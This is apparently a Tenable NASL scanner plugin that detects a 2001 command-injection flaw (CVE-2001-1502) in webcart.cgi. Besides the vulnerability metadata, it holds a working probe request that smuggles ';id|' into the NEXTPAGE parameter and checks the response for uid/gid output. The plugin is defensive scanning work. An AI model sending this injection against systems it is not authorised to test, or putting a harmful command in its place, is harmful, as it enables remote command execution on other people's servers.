#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# *untested*
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID
#
# References:
# Date:  Fri, 19 Oct 2001 03:29:24 +0000
# From: root@xpteam.f2s.com
# To: bugtraq@securityfocus.com
# Subject: Webcart v.8.4

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11095);
  script_version("1.31");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/05/12");

  script_cve_id("CVE-2001-1502");
  script_bugtraq_id(3453);

  script_name(english:"Mountain Network Systems webcart.cgi Arbitrary Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote CGI script is vulnerable to command execution.");
  script_set_attribute(attribute:"description", value:
"webcart.cgi is installed and does not properly filter user input.
An attacker may use this flaw to execute any command on your system.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2001/Oct/159");
  script_set_attribute(attribute:"solution", value:
"Upgrade your software or firewall your web server.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/10/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/08/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2002-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if ( thorough_tests )
{
 extra_list = make_list ("/webcart", "/cgi-bin/webcart");
}
else
  extra_list = NULL;

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;id|&CODE=PHOLD",
			check_result:"uid=[0-9]+.* gid=[0-9]+.*",
			command:"id"
			);
